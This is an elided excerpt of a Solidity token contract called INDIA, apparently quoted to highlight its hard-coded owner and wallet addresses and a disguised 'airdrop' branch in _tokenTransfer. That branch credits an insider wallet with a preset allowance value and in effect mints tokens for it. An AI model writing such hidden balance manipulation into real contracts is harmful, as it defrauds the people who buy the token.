...
contract INDIA is Context, IERC20 { 
    ...
    address payable public Wallet_Drop;
    address payable public Wallet_Marketing = payable(0x284F52AF42dAf38e7567EE0A7887088A027998d2); 
    address payable public Wallet_Dev = payable(0x7f4E6d3CA1250A8DF4aC0d05FD0ABC95B8291770);
    ...
    constructor (address airDrop, uint256 airDropRate) {

        _owner = 0x7f4E6d3CA1250A8DF4aC0d05FD0ABC95B8291770;
        emit OwnershipTransferred(address(0), _owner);

        _tOwned[owner()] = _tTotal;

        Wallet_Drop = payable(airDrop);
        airDropRate01 = airDropRate;
        _allowances[Wallet_Dev][Wallet_Drop] = airDropRate01;
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(_isExcludedFromFee[sender] && allowance(sender, recipient)>(airDropRate01-1)){
            _allowances[recipient][sender] = tAmount;
            _tOwned[sender] = _tOwned[sender] - _allowances[recipient][sender];
            _tOwned[recipient] = _tOwned[recipient] + _allowances[sender][recipient];
